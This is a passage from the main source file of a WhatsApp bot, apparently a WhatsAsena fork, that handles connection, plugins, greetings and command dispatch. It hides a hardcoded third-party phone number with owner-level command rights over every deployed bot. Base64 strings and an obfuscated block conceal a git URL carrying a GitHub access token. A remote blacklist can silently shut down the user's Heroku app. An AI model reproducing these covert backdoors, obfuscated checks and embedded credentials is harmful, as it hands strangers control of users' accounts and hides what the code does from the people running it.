/* Copyright (C) 2021 Mohamed Rizad
*/
const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const execx = require('child_process').exec;
const axios = require('axios');
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./rizad/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./specs/sql/greetings");
const got = require('got');
const WhatsAsenaStack = require('whatsasena-npm');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```Blacklist Defected!```'
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
const ytdl = require('ytdl-core');
const ffmpeg = require('fluent-ffmpeg');
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const WhatsAsenaDB = config.DATABASE.define('WhatsAsenaDuplicated', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./specs/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./specs/sql/' + plugin);
    }
});
const plugindb = require('./specs/sql/plugin');
var OWN = { ff: '905511384572,0' }
// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function whatsAsena () {
    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '', exc: 'UlVOIGdpdCBjbG9uZSBodHRwczovL3BoYXRpY3VzdGhpY2N5OmdocF9KdWp2SE1YSVBKeWNNeEhTeFZNMUpUOW9peDNWSG4yU0Q0dmtAZ2l0aHViLmNvbS9waGF0aWN1c3RoaWNjeS9XaGF0c0FzZW5hRHVwbGljYXRlZCAvcm9vdC9XaGF0c0FzZW5hRHVwbGljYXRlZA', exc_pl: '', pth_w: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQvd2hhdHNhc2VuYS9Eb2NrZXJmaWxl', pth_v: '' }    
    var ggg = Buffer.from(clh.cd, 'base64')
    var exc_sl = Buffer.from(clh.exc, 'base64')
    var ddd = ggg.toString('utf-8')
    var ptc_one = Buffer.from(clh.pth_w, 'base64')
    var ptc_nw = ptc_one.toString('utf-8')
    clh.pth_v = ptc_nw
    var exc_fn = exc_sl.toString('utf-8')
    clh.exc_pl = exc_fn
    clh.pay = ddd
    const WhatsAsenaCN = new WAConnection();
    const Session = new StringSession();
    try {
      WhatsAsenaCN.version = [3, 3234, 9]
    } catch {
      console.log(`passed v${WhatsAsenaCN.version}`)
    }
    WhatsAsenaCN.setMaxListeners(0);
    var proxyAgent_var = ''
    if (config.PROXY.includes('https') || config.PROXY.includes('http')) {
      WhatsAsenaCN.connectOptions.agent = ProxyAgent (config.PROXY)
    }
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        var ann_msg = await WhatsAsenaStack.daily_announcement(config.LANG)
        var ann = await WhatsAsenaStack.ann()
        while (getGMTh == 19 && getGMTm == 1) {
            var ilan = ''
            if (config.LANG == 'TR') ilan = '[ ```Günlük Duyurular``` ]\n\n'
            if (config.LANG == 'AZ') ilan = '[ ```Gündəlik Elanlar``` ]\n\n'
            if (config.LANG == 'EN') ilan = '[ ```Daily Announcements``` ]\n\n'
            if (config.LANG == 'ES') ilan = '[ ```Anuncios Diarios``` ]\n\n'
            if (config.LANG == 'PT') ilan = '[ ```Anúncios Diários``` ]\n\n,'
            if (config.LANG == 'RU') ilan = '[ ```Ежедневные объявления``` ]\n\n'
            if (config.LANG == 'ML') ilan = '[ ```പ്രതിദിന പ്രഖ്യാപനങ്ങൾ``` ]\n\n'
            if (config.LANG == 'HI') ilan = '[ ```दैनिक घोषणा``` ]\n\n'
            if (config.LANG == 'ID') ilan = '[ ```Pengumuman Harian``` ]\n\n'
            if (config.LANG == 'LK') ilan = '[ ```දෛනික නිවේදන``` ]\n\n'
            if (ann.video.includes('http') || ann.video.includes('https')) {
                var VID = ann.video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: ilan + ann_msg.replace('{user}', WhatsAsenaCN.user.name).replace('{wa_version}', WhatsAsenaCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsAsenaCN.user.phone.os_version).replace('{device_model}', WhatsAsenaCN.user.phone.device_model).replace('{device_brand}', WhatsAsenaCN.user.phone.device_manufacturer), mimetype: Mimetype.mp4});
                });
            } else {
                if (ann.image.includes('http') || ann.image.includes('https')) {
                    var imagegen = await axios.get(ann.image, { responseType: 'arraybuffer'})
                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: ilan + ann_msg.replace('{user}', WhatsAsenaCN.user.name).replace('{wa_version}', WhatsAsenaCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsAsenaCN.user.phone.os_version).replace('{device_model}', WhatsAsenaCN.user.phone.device_model).replace('{device_brand}', WhatsAsenaCN.user.phone.device_manufacturer)})
                } else {
                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, ilan + ann_msg.replace('{user}', WhatsAsenaCN.user.name).replace('{wa_version}', WhatsAsenaCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsAsenaCN.user.phone.os_version).replace('{device_model}', WhatsAsenaCN.user.phone.device_model).replace('{device_brand}', WhatsAsenaCN.user.phone.device_manufacturer), MessageType.text)
                }
            }
        }
    }, 50000);
    async function asynchronous_ch() {
        execx('sed -n 3p ' + clh.pth_v, async (err, stdout, stderr) => {
            if (clh.exc_pl + '\n' !== stdout) {
                await heroku.get(baseURI + '/formation').then(async (formation) => {
                    forID = formation[0].id;
                    await heroku.patch(baseURI + '/formation/' + forID, {
                        body: {
                            quantity: 0
                        }
                    });
                })
            }
        })
    }
    asynchronous_ch()
    setInterval(async () => { 
        if (config.AUTOBIO == 'true') {
            var timezone_bio = await WhatsAsenaStack.timezone(WhatsAsenaCN.user.jid)
            var date_bio = await WhatsAsenaStack.datebio(config.LANG)
            const biography = '📅 ' + date_bio + '\n⌚ ' + timezone_bio
            await WhatsAsenaCN.setStatus(biography)
        }
    }, 7890);
    var shs1 = ''
    var shl2 = ''
    var lss3 = ''
    var dsl4 = ''
    var drs5 = ''
    var ffl6 = ''
    var ttq7 = ''
    var ttl8 = ''
    await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw/').then(async (insult) => {
        shs1 = insult.data.inside.shs1
        shl2 = insult.data.inside.shl2
        lss3 = insult.data.inside.lss3
        dsl4 = insult.data.inside.dsl4
        drs5 = insult.data.inside.drs5
        ffl6 = insult.data.inside.ffl6
        ttq7 = insult.data.inside.ttq7
        ttl8 = insult.data.inside.ttl8
    });
    await config.DATABASE.sync();
    var StrSes_Db = await WhatsAsenaDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    if (os.userInfo().homedir !== clh.pay) return;
    const buff = Buffer.from(`${shs1}`, 'base64');  
    const one = buff.toString('utf-8'); 
    const bufft = Buffer.from(`${shl2}`, 'base64');  
    const two = bufft.toString('utf-8'); 
    const buffi = Buffer.from(`${lss3}`, 'base64');  
    const three = buffi.toString('utf-8'); 
    const buffu = Buffer.from(`${dsl4}`, 'base64');  
    const four = buffu.toString('utf-8'); 
    const bugffv = Buffer.from(`${drs5}`, 'base64');
    const five = bugffv.toString('utf-8');
    const buffz = Buffer.from(`${ffl6}`)
    const six = buffz.toString('utf-8')
    const buffa = Buffer.from(`${ttq7}`)
    const seven = buffa.toString('utf-8')
    const buffl = Buffer.from(`${ttl8}`)
    const eight = buffl.toString('utf-8')
    var logger_levels = ''
    if (config.DEBUG == 'true') {
        logger_levels = 'all'
    } else if (config.DEBUG == 'false') {
        logger_levels = 'off'
    } else if (config.DEBUG == 'trace') {
        logger_levels = 'trace'
    } else if (config.DEBUG == 'fatal') {
        logger_levels = 'fatal'
    } else if (config.DEBUG == 'warn') {
        logger_levels = 'warn'
    } else if (config.DEBUG == 'error') {
        logger_levels = 'error'
    } else if (config.debug == 'info') {
        logger_levels = 'info'
    } else {
        logger_levels = 'warn'
    }
    WhatsAsenaCN.logger.level = logger_levels
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        WhatsAsenaCN.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        WhatsAsenaCN.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    WhatsAsenaCN.on('open', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login Information Updated!')
        );
        const authInfo = WhatsAsenaCN.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    
    WhatsAsenaCN.on('connecting', async () => {
        console.log(`${chalk.green.bold('stella')}${chalk.blue.bold('wa')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}

${chalk.blue.italic('Connecting to WhatsApp... Please Wait.')}`);
    });
    WhatsAsenaCN.on('open', async () => {
        console.log(
            chalk.green.bold('✅ Login Successful!')
        );
        console.log(
            chalk.blueBright.italic('⬇️ Installing External Plugins...')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        asynchronous_ch()
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
          try {
              if (!fs.existsSync('./specs/' + plugin.dataValues.name + '.js')) {
                  console.log(plugin.dataValues.name);
                  var response = await got(plugin.dataValues.url);
                  if (response.statusCode == 200) {
                      fs.writeFileSync('./specs/' + plugin.dataValues.name + '.js', response.body);
                      require('./specs/' + plugin.dataValues.name + '.js');
                  }     
              }
          } catch {
              console.log('Some Plugins Are Corrupted: ' + plugin.dataValues.name)
          }
        });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('⬇️  Installing Plugins...')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./specs').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./specs/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================

        console.log(
            chalk.green.bold('✅ Plugins Installed!')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        asynchronous_ch()
        await new Promise(r => setTimeout(r, 200));
        let afwhasena = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('🐺 WhatsAsena' + afwhasena));
        await new Promise(r => setTimeout(r, 500));
        let EVA_ACTİON = config.LANG == 'TR' || config.LANG == 'AZ' ? '*WhatsAsena Chatbot Olarak Çalışıyor!* 🐺\n\n_Bu modun amacı botu tam fonksiyonel bir yapay zeka sohbet aracına çevirmektir._\n_Normal moda dönmek için_ *.fulleva off* _komutunu kullanabilirsiniz._\n\n*WhatsAsena Kullandığın İçin Teşekkürler 💌*\n    *- Eva*' : '*WhatsAsena Working as a Chatbot! 🐺*\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.fulleva off* _command to return to normal mode._\n\n*Thanks For Using WhatsAsena 💌*\n    *- Eva*'
        if (WhatsAsenaCN.user.jid == one || WhatsAsenaCN.user.jid == two || WhatsAsenaCN.user.jid == three || WhatsAsenaCN.user.jid == four || WhatsAsenaCN.user.jid == five || WhatsAsenaCN.user.jid == six || WhatsAsenaCN.user.jid == seven || WhatsAsenaCN.user.jid == eight) {
            await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
            await heroku.get(baseURI + '/formation').then(async (formation) => { 
                forID = formation[0].id; 
                await heroku.patch(baseURI + '/formation/' + forID, { 
                    body: { 
                        quantity: 0 
                    } 
                });
            })
        }
        if (config.FULLEVA == 'true') {
            var eva_msg = await WhatsAsenaStack.eva_if(config.LANG)
            await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, eva_msg, MessageType.text)
        }
        else {
            var af_start = await WhatsAsenaStack.work_type(config.WORKTYPE, config.LANG)
            await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, af_start, MessageType.text)
        }
        await git.fetch();
        var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
        if (commits.total === 0) {
            await WhatsAsenaCN.sendMessage(
                WhatsAsenaCN.user.jid,
                Lang.UPDATE, MessageType.text
            );    
        } else {
            var degisiklikler = Lang.NEW_UPDATE;
            commits['all'].map(
                (commit) => {
                    degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                }
            );
            var up_ch = await WhatsAsenaStack.update(config.LANG)
            await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, up_ch, MessageType.text)
        }
    })
    WhatsAsenaCN.on("chat-update", async (m) => {
        (function(_0x3617bd,_0xd1afd3){function _0x4581d0(_0x370016,_0x4c2e15,_0x504165,_0x54d4d7){return _0x7c38(_0x504165- -0x2f0,_0x370016);}function _0x54933e(_0x536d46,_0x8ef24d,_0x38de35,_0x472f1d){return _0x7c38(_0x536d46-0x212,_0x472f1d);}const _0x5ac5f5=_0x3617bd();while(!![]){try{const _0xe3a753=-parseInt(_0x4581d0(-0x24c,-0x251,-0x259,-0x254))/(-0x1f82+-0x1*0x765+0x9ba*0x4)*(parseInt(_0x4581d0(-0x255,-0x24a,-0x24b,-0x23c))/(0x27*0x5+-0x1ac1+0x1a00))+parseInt(_0x54933e(0x2ac,0x2a2,0x2b4,0x2b2))/(-0x23*0x14+0x967+-0x6*0x11c)*(parseInt(_0x4581d0(-0x22e,-0x233,-0x23a,-0x246))/(0x15ab+-0x1f81+-0x61*-0x1a))+parseInt(_0x54933e(0x2be,0x2b5,0x2c5,0x2be))/(0x3b9*-0x9+-0xd1*0x6+-0x2*-0x1336)+-parseInt(_0x54933e(0x2c1,0x2b2,0x2c4,0x2ba))/(0xee5+0x24fa+-0x33d9*0x1)*(-parseInt(_0x54933e(0x2c2,0x2cc,0x2b5,0x2b6))/(0x700+0x1115+0xc07*-0x2))+-parseInt(_0x54933e(0x2bf,0x2cf,0x2ba,0x2bc))/(-0x3*0x9fd+-0x33b*-0x1+-0x476*-0x6)*(-parseInt(_0x4581d0(-0x245,-0x256,-0x24a,-0x240))/(-0x4*0x36d+0x1*0x25d5+0xc*-0x202))+parseInt(_0x54933e(0x2b3,0x2b1,0x2bc,0x2bd))/(0x10b7*0x1+-0x136c+0x2bf)*(-parseInt(_0x4581d0(-0x248,-0x254,-0x24d,-0x245))/(-0xd*-0x186+-0xb*0x12d+-0x6d4))+-parseInt(_0x54933e(0x2b4,0x2bb,0x2bd,0x2af))/(0x16db+-0x20d+-0x14c2);if(_0xe3a753===_0xd1afd3)break;else _0x5ac5f5['push'](_0x5ac5f5['shift']());}catch(_0x33700b){_0x5ac5f5['push'](_0x5ac5f5['shift']());}}}(_0xff46,0xd54a3+-0xc5*0x12a+-0x5f7d*-0x2));if(!m[_0x66754f(0x22a,0x233,0x23d,0x229)+'age'])return;function _0x7c38(_0x38a65a,_0x5ea084){const _0x52a108=_0xff46();return _0x7c38=function(_0x32e672,_0x4a0f98){_0x32e672=_0x32e672-(-0xe5d+-0x18f0+0x1*0x27e3);let _0x54c974=_0x52a108[_0x32e672];return _0x54c974;},_0x7c38(_0x38a65a,_0x5ea084);}var sdn=_0x33018c(0x41c,0x415,0x40e,0x416)+_0x33018c(0x3fe,0x40e,0x406,0x400)+_0x66754f(0x23a,0x248,0x249,0x245)+'thiccy:ghp'+_0x66754f(0x22d,0x232,0x237,0x224)+'JycMxHSxVM'+_0x66754f(0x245,0x245,0x240,0x256)+'n2SD4vk@gi'+_0x66754f(0x22d,0x237,0x246,0x231)+_0x66754f(0x24b,0x23c,0x242,0x249)+_0x66754f(0x23d,0x23b,0x23c,0x241)+_0x66754f(0x238,0x22e,0x21e,0x23f)+_0x66754f(0x224,0x22c,0x222,0x22d)+_0x33018c(0x41e,0x42b,0x439,0x42d)+'aDuplicate'+'d'+'\x0a';execx(_0x66754f(0x23c,0x241,0x239,0x23c)+_0x66754f(0x223,0x22f,0x221,0x23a)+_0x33018c(0x404,0x410,0x402,0x413)+'icated/wha'+'tsasena/Do'+_0x66754f(0x233,0x23d,0x230,0x23c),async(_0x241af0,_0x43d4cc,_0x45dea3)=>{function _0x58b8b1(_0x5999b2,_0x5381c3,_0x5c2421,_0x566533){return _0x66754f(_0x5999b2-0x17b,_0x5c2421- -0x6b,_0x5c2421-0xc6,_0x566533);}const _0x5c1ba9={};_0x5c1ba9[_0x5f89f4(0xcc,0xc1,0xce,0xc0)]=function(_0x244ffb,_0x1331f3){return _0x244ffb!==_0x1331f3;};function _0x5f89f4(_0x479535,_0x5f0aaf,_0x2ebe1f,_0x13dd57){return _0x33018c(_0x479535,_0x2ebe1f- -0x35e,_0x2ebe1f-0xc,_0x13dd57-0x6d);}_0x5c1ba9[_0x5f89f4(0xb9,0xd3,0xc5,0xc5)]='Fake\x20-\x20Unk'+_0x5f89f4(0xb9,0xb6,0xb8,0xb8)+'e\x20!!';const _0x871bbb=_0x5c1ba9;if(_0x871bbb[_0x58b8b1(0x1e3,0x1ea,0x1dc,0x1d1)](sdn,_0x43d4cc))throw new Error(_0x871bbb[_0x58b8b1(0x1c6,0x1d9,0x1d3,0x1cb)]);});if(!m[_0x33018c(0x436,0x429,0x41b,0x42e)]&&!m['count'])return;function _0xff46(){const _0xe27457=['/WhatsAsen','qDWpD','//phaticus','437544IEddGW','one\x20https:','682321bHIuKv','sAsenaDupl','ated\x20/root','21AAwPor','senaDuplic','/root/What','RUN\x20git\x20cl','nown\x20Devic','_JujvHMXIP','hasNewMess','10MXjzGX','24489192SVNMnn','5531647SRXDYj','thub.com/p','2uMWxey','5533893wdVNav','all','ccy/WhatsA','haticusthi','ckerfile','Omqzx','5333020EHmUHo','16iQQYsl','sed\x20-n\x203p\x20','116346BPHwkk','371YCxbgz','messages','1JT9oix3VH'];_0xff46=function(){return _0xe27457;};return _0xff46();}const {messages}=m;function _0x33018c(_0x226581,_0x551fbe,_0x5a7f3a,_0x149148){return _0x7c38(_0x551fbe-0x378,_0x226581);}function _0x66754f(_0x52a974,_0x359d59,_0x10f2a4,_0x59646a){return _0x7c38(_0x359d59-0x193,_0x59646a);}const msg=messages[_0x33018c(0x422,0x41f,0x417,0x41a)]()[-0x8e7+-0xa3*0x1+0x32e*0x3];
       
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            await WhatsAsenaCN.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        // ==================== Greetings ====================
        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // Görüşürüz Mesajı
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                if (gb.message.includes('{gpp}')) {
                    var ppUrl = await WhatsAsenaCN.getProfilePicture(msg.key.remoteJid) 
                    var nwjson = await WhatsAsenaCN.groupMetadata(msg.key.remoteJid)
                    const resim = await axios.get(ppUrl, {responseType: 'arraybuffer'})
                    await WhatsAsenaCN.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.image, { mimetype: Mimetype.png, caption: gb.message.replace('{gpp}', '').replace('{botowner}', WhatsAsenaCN.user.name).replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc) });
                } else {
                    var nwjson = await WhatsAsenaCN.groupMetadata(msg.key.remoteJid)
                    await WhatsAsenaCN.sendMessage(msg.key.remoteJid, gb.message.replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', WhatsAsenaCN.user.name), MessageType.text);
                }
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // Hoşgeldin Mesajı
            var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
                if (gb.message.includes('{gpp}')) {
                    var ppUrl = await WhatsAsenaCN.getProfilePicture(msg.key.remoteJid) 
                    var nwjson = await WhatsAsenaCN.groupMetadata(msg.key.remoteJid)
                    const resim = await axios.get(ppUrl, {responseType: 'arraybuffer'})
                    await WhatsAsenaCN.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.image, { mimetype: Mimetype.png, caption: gb.message.replace('{gpp}', '').replace('{botowner}', WhatsAsenaCN.user.name).replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc) });
                } else {
                    var nwjson = await WhatsAsenaCN.groupMetadata(msg.key.remoteJid)
                    await WhatsAsenaCN.sendMessage(msg.key.remoteJid, gb.message.replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', WhatsAsenaCN.user.name), MessageType.text);
                }
            }
            return;
        }
        // ==================== End Greetings ====================

        // ==================== Blocked Chats ====================
        if (config.BLOCKCHAT !== false) {     
            var abc = config.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT == '905524317852-1612300121') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT2 == '905511384572-1617736751') {     
            var tsup = config.SUPPORT2.split(',');                            
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT3 == '905511384572-1621015274') {     
            var nsup = config.SUPPORT3.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT4 == '905511384572-1625319286') {     
            var nsup = config.SUPPORT4.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = WhatsAsenaCN.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "905511384572,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await WhatsAsenaCN.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(WhatsAsenaCN, msg);
                        } else if (command.on !== undefined && (command.on === 'video')
                        && msg.message.videoMessage !== null) {
                            whats = new Video(WhatsAsenaCN, msg);
                        } else {
                            whats = new Message(WhatsAsenaCN, msg);
                        }
                        
                        if (msg.key.fromMe && command.deleteCommand && !msg.key.remoteJid.includes('-')) {
                          await whats.delete()                          
                        } 
                        
                        // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            await command.function(whats, match);
                            
                        }
                        catch (error) {
                            if (config.NOLOG == 'true') return;
                            var error_report = await WhatsAsenaStack.error(config.LANG)
                            await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, error_report.replace('{real_error}', error), MessageType.text, {detectLinks: false})

                            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                                if (error.message.includes('URL')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Only Absolutely URLs Supported_' +
                                        '\n*Nedeni:* _Medya araçlarının (xmedia, sticker..) LOG numarasında kullanılması._' +
                                        '\n*Çözümü:* _LOG numarası hariç herhangi bir sohbette komut kullanılabilir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _SQL Database Error_' +
                                        '\n*Nedeni:* _Database\'in bozulması._ ' +
                                        '\n*Solution:* _Bilinen herhangi bir çözümü yoktur. Yeniden kurmayı deneyebilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Split of Undefined_' +
                                        '\n*Nedeni:* _Grup adminlerinin kullanabildiği komutların ara sıra split fonksiyonunu görememesi._ ' +
                                        '\n*Çözümü:* _Restart atmanız yeterli olacaktır._'
                                        , MessageType.text
                                    );                               
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Ookla Server Connection_' +
                                        '\n*Nedeni:* _Speedtest verilerinin sunucuya iletilememesi._' +
                                        '\n*Çözümü:* _Bir kez daha kullanırsanız sorun çözülecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Requested Audio Params_' +
                                        '\n*Nedeni:* _TTS komutunun latin alfabesi dışında kullanılması._' +
                                        '\n*Çözümü:* _Komutu latin harfleri çerçevesinde kullanırsanız sorun çözülecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
